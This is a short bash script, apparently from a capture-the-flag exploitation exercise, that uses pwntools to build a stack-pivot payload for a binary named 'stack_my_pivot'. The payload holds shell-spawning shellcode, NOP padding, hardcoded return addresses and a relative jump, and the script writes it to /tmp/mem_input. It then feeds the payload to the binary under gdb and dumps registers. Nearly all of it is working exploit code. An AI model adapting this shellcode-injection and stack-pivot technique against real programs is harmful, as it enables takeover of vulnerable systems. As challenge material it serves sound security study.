#!/bin/bash

python3 << 'EOF'
from pwn import *
context.arch = 'amd64'

shellcode = asm(shellcraft.sh())
first_input = shellcode.ljust(50, b'\x90')

second_input = b'\x90' * 8
second_input += p64(0x400738)
second_input += b'\xeb\xa6'
second_input += b'\x90' * (23 - len(second_input))
second_input += p32(0x40072e)
second_input += b'\x90'

print("Second input hex:", second_input.hex())
print("Bytes [8:16]:", second_input[8:16].hex())

with open('/tmp/mem_input', 'wb') as f:
    f.write(first_input + second_input)
EOF

gdb -batch \
  -ex 'break *0x40072e' \
  -ex 'run < /tmp/mem_input' \
  -ex 'info registers rsp rsi rbp' \
  -ex 'printf "Second buffer at: %p\n", $rsi' \
  -ex 'x/4gx $rsi' \
  -ex 'continue' \
  ./stack_my_pivot 2>&1
